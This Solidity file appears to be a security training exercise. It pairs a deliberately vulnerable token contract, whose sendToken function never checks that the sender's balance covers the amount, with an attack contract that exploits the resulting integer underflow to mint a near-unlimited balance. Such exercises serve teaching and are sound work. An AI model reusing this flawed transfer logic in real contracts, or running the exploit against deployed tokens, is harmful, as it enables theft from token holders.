//*** Exercice 1 ***//
// Simple token you can buy and send.
contract SimpleToken{
    mapping(address => uint) public balances;
    event debugLog(address _who, uint256 _what);
    /// @dev Buy token at the price of 1ETH/token.
    function buyToken() payable returns (uint256 bal) {
        balances[msg.sender]+=msg.value / 1 ether;
        emit debugLog(msg.sender, balances[msg.sender]);
        return balances[msg.sender];
    }

    /** @dev Send token.
     *  @param _recipient The recipient.
     *  @param _amount The amount to send.
     */
    function sendToken(address _recipient, uint _amount) {
        require(balances[msg.sender]!=0); // You must have some tokens.

        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }

}

contract attackSimpleToken {

    SimpleToken victim;
    constructor(address _victim) public {
        victim = SimpleToken(_victim);
    }

    //function sendToken doesn't check if _amount is < balances[msg.sender]
    function attack(address _recipient) external payable returns(bool success) {
        require(msg.value >= 1 ether);
        victim.buyToken.value(msg.value)();
        victim.sendToken(_recipient, uint256(0-1));
        return true;
    }

    function getBalanceOf(address _who) external view returns(uint256 val) {
        return victim.balances(_who);
    }
}
